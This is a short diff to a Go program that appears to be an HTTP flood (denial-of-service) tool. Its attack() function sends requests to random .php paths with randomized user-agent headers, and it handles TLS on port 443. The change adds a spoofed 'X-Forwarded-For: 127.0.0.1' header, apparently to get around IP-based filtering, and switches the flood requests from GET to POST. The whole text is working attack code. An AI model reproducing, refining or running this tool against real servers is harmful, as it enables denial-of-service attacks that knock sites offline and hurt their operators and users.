@@ -89,7 +89,8 @@ func getheader() string {
 	referer := "Referer: " + "https://" + ip + "/" + "\r\n"
 	accept := acceptall[rand.Intn(len(acceptall))]
 	useragent := "User-Agent: " + useragent() + "\r\n"
-	header := connection + useragent + accept + referer + "\r\n"
+	forwarded := "X-Forwarded-For: 127.0.0.1\r\n"
+	header := connection + useragent + accept + forwarded + referer + "\r\n"
 	return header
 }
 
@@ -103,7 +104,7 @@ func attack() {
 		if rpath == true {
 			path = "/" + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + ".php"
 		}
-		get_host := "GET " + path + " HTTP/1.1\r\nHost: " + addr + "\r\n"
+		get_host := "POST " + path + " HTTP/1.1\r\nHost: " + addr + "\r\n"
 		request := get_host + header
 		if port == "443" {
 			cfg := &tls.Config{
